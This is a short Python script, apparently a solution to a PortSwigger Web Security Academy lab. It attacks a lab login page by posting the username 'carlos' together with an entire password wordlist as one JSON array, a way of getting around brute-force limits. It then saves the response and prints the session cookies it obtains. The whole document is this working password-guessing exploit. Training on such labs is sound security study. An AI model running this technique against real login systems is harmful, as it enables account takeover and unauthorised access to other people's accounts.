import requests

url = "https://ac5d1fd61fbd683dc0ab0164006600cc.web-security-academy.net/login"

status_code = requests.get(url=url).status_code
if status_code != 200:
    print(f'Status code: {status_code}')
    exit(status_code)

data = {
    'username': 'carlos',
    'password': open('password.txt').read().splitlines()
}

s = requests.session()
res = s.post(url=url, json=data, allow_redirects=True)
with open('res.html', 'wb') as file:
    file.write(res.content)
print(s.cookies.get_dict())
